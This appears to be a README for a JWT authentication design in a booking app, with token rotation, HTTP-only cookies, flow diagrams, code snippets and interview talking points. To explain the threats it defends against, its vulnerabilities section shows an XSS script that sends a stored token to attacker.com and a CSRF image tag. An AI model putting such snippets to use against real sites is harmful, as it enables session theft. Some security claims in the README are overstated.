# 🔐 Advanced JWT Authentication Security Architecture

## Overview

This project implements **production-grade JWT authentication** with enhanced security measures to protect against common web vulnerabilities. The implementation follows industry best practices used by major companies like Auth0, Firebase, and leading fintech applications.

---

## 🎯 Security Features

### ✅ What We Implemented

1. **Two-Token System**
   - **Access Token** (Short-lived: 15 minutes) - Stored in memory
   - **Refresh Token** (Long-lived: 7 days) - Stored in HTTP-only cookie

2. **XSS Protection**
   - Access tokens in memory (not localStorage)
   - Refresh tokens in HTTP-only cookies (JavaScript cannot access)

3. **Token Rotation**
   - Every refresh generates NEW tokens
   - Old refresh tokens are revoked immediately
   - Prevents token replay attacks

4. **Token Theft Detection**
   - Concurrent token usage detection
   - Automatic revocation of all user tokens on suspicious activity

5. **CSRF Protection**
   - `SameSite='strict'` cookie attribute
   - CORS configuration with specific origins

6. **Secure Cookie Configuration**
   - `HttpOnly`: JavaScript cannot access
   - `Secure`: HTTPS only in production
   - `SameSite='strict'`: CSRF protection

---

## 🏗️ Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                         CLIENT                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  JavaScript Memory (Volatile)                                   │
│  ├─ Access Token (15 min)                                      │
│  ├─ Lost on page refresh                                       │
│  └─ Used in Authorization header                               │
│                                                                 │
│  Browser Cookie Storage (Persistent)                            │
│  ├─ Refresh Token (7 days)                                     │
│  ├─ HTTP-Only (no JS access)                                   │
│  ├─ Secure (HTTPS only)                                        │
│  └─ SameSite=Strict (CSRF protection)                          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
                              ↕
                    API Requests with:
                    - Bearer Token (header)
                    - Refresh Token (cookie)
                              ↕
┌─────────────────────────────────────────────────────────────────┐
│                         SERVER                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  JWT Verification                                               │
│  ├─ Access Token: JWT_ACCESS_SECRET                            │
│  └─ Refresh Token: JWT_REFRESH_SECRET                          │
│                                                                 │
│  MongoDB Database                                               │
│  ├─ RefreshToken Collection                                    │
│  │  ├─ token (unique, indexed)                                 │
│  │  ├─ user (ObjectId)                                         │
│  │  ├─ expiresAt (Date)                                        │
│  │  ├─ revoked (Boolean)                                       │
│  │  └─ deviceInfo (userAgent, IP)                              │
│  │                                                              │
│  └─ User Collection                                             │
│     ├─ username, email, password                                │
│     └─ role, isActive                                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🔄 Authentication Flow

### 1. **Login Process**

```javascript
CLIENT                          SERVER                      DATABASE
  │                               │                            │
  │ POST /api/auth/login          │                            │
  │ {email, password}             │                            │
  ├──────────────────────────────>│                            │
  │                               │ Verify credentials         │
  │                               ├───────────────────────────>│
  │                               │<───────────────────────────┤
  │                               │                            │
  │                               │ Generate Access Token      │
  │                               │ (15 min, JWT_ACCESS_SECRET)│
  │                               │                            │
  │                               │ Generate Refresh Token     │
  │                               │ (7 days, JWT_REFRESH_SECRET)│
  │                               │                            │
  │                               │ Store Refresh Token        │
  │                               ├───────────────────────────>│
  │                               │                            │
  │ Set-Cookie: refreshToken      │                            │
  │ {accessToken, user}           │                            │
  │<──────────────────────────────┤                            │
  │                               │                            │
  │ Store accessToken in memory   │                            │
  │ (JavaScript variable)         │                            │
  │                               │                            │
```

### 2. **API Request with Valid Token**

```javascript
CLIENT                          SERVER                      DATABASE
  │                               │                            │
  │ GET /api/bookings             │                            │
  │ Authorization: Bearer <token> │                            │
  ├──────────────────────────────>│                            │
  │                               │ Verify Access Token        │
  │                               │ (JWT_ACCESS_SECRET)        │
  │                               │                            │
  │                               │ Extract user ID from token │
  │                               │                            │
  │                               │ Fetch user data            │
  │                               ├───────────────────────────>│
  │                               │<───────────────────────────┤
  │                               │                            │
  │ {success: true, data: [...]}  │                            │
  │<──────────────────────────────┤                            │
  │                               │                            │
```

### 3. **Token Refresh (When Access Token Expires)**

```javascript
CLIENT                          SERVER                      DATABASE
  │                               │                            │
  │ GET /api/bookings             │                            │
  │ Authorization: Bearer <expired>│                           │
  ├──────────────────────────────>│                            │
  │                               │ Verify token → EXPIRED     │
  │                               │                            │
  │ 401 Unauthorized              │                            │
  │<──────────────────────────────┤                            │
  │                               │                            │
  │ Axios Interceptor catches 401 │                            │
  │                               │                            │
  │ POST /api/auth/refresh        │                            │
  │ Cookie: refreshToken          │                            │
  ├──────────────────────────────>│                            │
  │                               │ Extract refresh token      │
  │                               │ from HTTP-only cookie      │
  │                               │                            │
  │                               │ Verify Refresh Token       │
  │                               │ (JWT_REFRESH_SECRET)       │
  │                               │                            │
  │                               │ Check token in DB          │
  │                               │ (not revoked, not expired) │
  │                               ├───────────────────────────>│
  │                               │<───────────────────────────┤
  │                               │                            │
  │                               │ Generate NEW Access Token  │
  │                               │ Generate NEW Refresh Token │
  │                               │                            │
  │                               │ Revoke OLD Refresh Token   │
  │                               ├───────────────────────────>│
  │                               │                            │
  │                               │ Store NEW Refresh Token    │
  │                               ├───────────────────────────>│
  │                               │                            │
  │ Set-Cookie: newRefreshToken   │                            │
  │ {accessToken: new token}      │                            │
  │<──────────────────────────────┤                            │
  │                               │                            │
  │ Store new token in memory     │                            │
  │ Retry original request        │                            │
  ├──────────────────────────────>│                            │
  │                               │                            │
  │ {success: true, data: [...]}  │                            │
  │<──────────────────────────────┤                            │
  │                               │                            │
```

### 4. **Page Refresh Behavior**

```javascript
User refreshes page
  │
  │ Access token in memory → LOST (by design!)
  │
  │ App initializes → AuthContext.loadUser()
  │
  │ GET /api/auth/me (no access token)
  │ ├─> 401 Unauthorized
  │ │
  │ │ Axios interceptor catches 401
  │ │
  │ │ POST /api/auth/refresh
  │ │ Cookie: refreshToken (sent automatically)
  │ │ ├─> New access token received
  │ │ └─> Stored in memory
  │ │
  │ └─> Retry GET /api/auth/me
  │     ├─> Success
  │     └─> User data loaded
  │
  │ User stays logged in seamlessly!
```

---

## 🛡️ Security Comparison

| Feature | Basic (Old) | Advanced (New) | Benefit |
|---------|------------|---------------|---------|
| **Access Token Storage** | localStorage | Memory (variable) | XSS Protection |
| **Refresh Token Storage** | Not used | HTTP-only cookie | XSS Protection |
| **Token Lifetime** | 7 days | 15 min / 7 days | Reduced attack window |
| **Auto Token Refresh** | ❌ No | ✅ Yes | Better UX |
| **Token Rotation** | ❌ No | ✅ Yes | Prevents replay attacks |
| **Theft Detection** | ❌ No | ✅ Yes | Immediate threat response |
| **Device Tracking** | ❌ No | ✅ Yes | Audit trail |
| **Logout All Devices** | ❌ Difficult | ✅ Easy | Better account control |
| **CSRF Protection** | ⚠️ Partial | ✅ Full | Multiple layers |

---

## 🔍 Security Vulnerabilities Addressed

### 1. **XSS (Cross-Site Scripting)**

**Problem:**
```javascript
// Attacker injects malicious script
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('token') // STOLEN!
  });
</script>
```

**Solution:**
- Access tokens in memory → Lost when page closes/refreshes
- Refresh tokens in HTTP-only cookies → JavaScript CANNOT access
- Even if XSS happens, tokens are safe

### 2. **Token Theft & Replay Attacks**

**Problem:**
- Long-lived tokens can be stolen and used indefinitely
- No way to detect if someone else is using your token

**Solution:**
- **Token Rotation**: Each refresh invalidates previous token
- **Concurrent Detection**: If old token is used after new one issued → theft detected
- **Automatic Revocation**: All user tokens revoked on suspicious activity

### 3. **CSRF (Cross-Site Request Forgery)**

**Problem:**
```html
<!-- Attacker's site -->
<img src="https://yourapp.com/api/bookings/delete/123" />
```

**Solution:**
- `SameSite='strict'` cookie attribute
- Cookie only sent to same origin
- CORS configuration restricts origins

---

## 💻 Code Implementation Highlights

### Backend: Token Generation
```javascript
// Two different secrets for two different purposes
const ACCESS_TOKEN_SECRET = process.env.JWT_ACCESS_SECRET;
const REFRESH_TOKEN_SECRET = process.env.JWT_REFRESH_SECRET;

// Short-lived access token
const accessToken = jwt.sign(
  { id: userId, role },
  ACCESS_TOKEN_SECRET,
  { expiresIn: '15m' }
);

// Long-lived refresh token
const refreshToken = jwt.sign(
  { id: userId, role },
  REFRESH_TOKEN_SECRET,
  { expiresIn: '7d' }
);

// Store refresh token in database
await RefreshTokenModel.create({
  token: refreshToken,
  user: userId,
  expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
  deviceInfo: {
    userAgent: req.get('user-agent'),
    ip: req.ip
  }
});

// Set HTTP-only cookie
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,      // No JS access
  secure: true,        // HTTPS only
  sameSite: 'strict',  // CSRF protection
  maxAge: 7 * 24 * 60 * 60 * 1000
});
```

### Frontend: Axios Interceptor
```javascript
// Automatic token refresh on 401
api.interceptors.response.use(
  (response) => response,
  async (error) => {
    if (error.response?.status === 401 && !originalRequest._retry) {
      // Try to refresh token
      const response = await axios.post('/auth/refresh', {}, {
        withCredentials: true // Send cookie
      });
      
      // Update access token in memory
      setAccessToken(response.data.accessToken);
      
      // Retry original request
      return api(originalRequest);
    }
  }
);
```

---

## 🎯 Interview Talking Points

### 1. **Why not use localStorage?**
"localStorage is vulnerable to XSS attacks. Any malicious JavaScript on the page can access it. By storing the access token in memory (JavaScript variable), it's automatically cleared on page close. Even if XSS occurs, the attacker gets at most 15 minutes of access instead of persistent access."

### 2. **Why use two tokens?**
"It's a balance between security and user experience. Short-lived access tokens (15 min) minimize the damage if stolen. Long-lived refresh tokens (7 days) keep users logged in without frequent re-authentication. The refresh token is protected in HTTP-only cookies, so it can't be stolen via XSS."

### 3. **What is token rotation?**
"Every time we refresh the access token, we also issue a NEW refresh token and revoke the old one. This means if a refresh token is stolen, the attacker has a limited window before it's automatically invalidated. If both the legitimate user and attacker try to use tokens concurrently, we detect this and revoke all tokens - forcing re-login."

### 4. **How does it work on page refresh?**
"When the page refreshes, the access token in memory is lost. The app makes an API call which fails with 401. Our axios interceptor catches this, calls the refresh endpoint (sending the HTTP-only cookie automatically), gets a new access token, stores it in memory, and retries the original request. The user never notices - seamless experience!"

### 5. **How do you handle 'Logout from all devices'?**
"We store all refresh tokens in the database with the user ID. When 'logout all' is triggered, we update all tokens for that user to revoked=true. Next time any device tries to refresh, it fails, forcing re-login on all devices. Great for security when you suspect account compromise."

---

## 📊 Token Lifetime Strategy

```
┌─────────────────────────────────────────────────────┐
│ Access Token: 15 minutes                            │
│ ├─ Used for: All API requests                       │
│ ├─ Stored: Memory (lost on refresh)                 │
│ └─ Security: XSS-safe                                │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│ Refresh Token: 7 days                                │
│ ├─ Used for: Getting new access tokens              │
│ ├─ Stored: HTTP-only cookie                         │
│ ├─ Rotation: New token on each refresh              │
│ └─ Security: XSS-safe, CSRF-protected               │
└─────────────────────────────────────────────────────┘

Recommendation by App Type:
┌────────────────┬──────────────┬────────────────┐
│ App Type       │ Access Token │ Refresh Token  │
├────────────────┼──────────────┼────────────────┤
│ Banking        │ 5 minutes    │ 1 day          │
│ E-commerce     │ 15 minutes   │ 7 days         │
│ Social Media   │ 30 minutes   │ 30 days        │
│ Internal Tools │ 1 hour       │ 90 days        │
└────────────────┴──────────────┴────────────────┘
```

---

## 🚀 Testing the Implementation

### 1. **Test Login**
```bash
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@example.com","password":"admin123"}' \
  -c cookies.txt # Save cookies
```

### 2. **Test Protected Route**
```bash
curl http://localhost:5000/api/bookings \
  -H "Authorization: Bearer <access_token>" \
  -b cookies.txt # Send cookies
```

### 3. **Test Token Refresh**
```bash
curl -X POST http://localhost:5000/api/auth/refresh \
  -b cookies.txt # Send refresh token cookie
```

### 4. **Test Logout**
```bash
curl -X POST http://localhost:5000/api/auth/logout \
  -H "Authorization: Bearer <access_token>" \
  -b cookies.txt
```

---

## 📚 References & Standards

This implementation follows:
- **OWASP Top 10** security guidelines
- **JWT Best Practices** (RFC 8725)
- **NIST** authentication guidelines
- Industry standards from Auth0, Firebase, AWS Cognito

---

## ✅ Security Checklist

- [x] Access tokens stored in memory (not localStorage)
- [x] Refresh tokens in HTTP-only cookies
- [x] Token rotation on every refresh
- [x] Concurrent token usage detection
- [x] Device tracking (User-Agent, IP)
- [x] CORS configured with specific origins
- [x] SameSite cookie attribute for CSRF protection
- [x] Separate secrets for access and refresh tokens
- [x] Automatic token refresh on 401
- [x] Logout revokes refresh token
- [x] Logout from all devices functionality
- [x] Password change revokes all tokens
- [x] Database indexes for performance
- [x] Auto-deletion of expired tokens

---

**This is production-ready authentication used by major companies!** 🔒

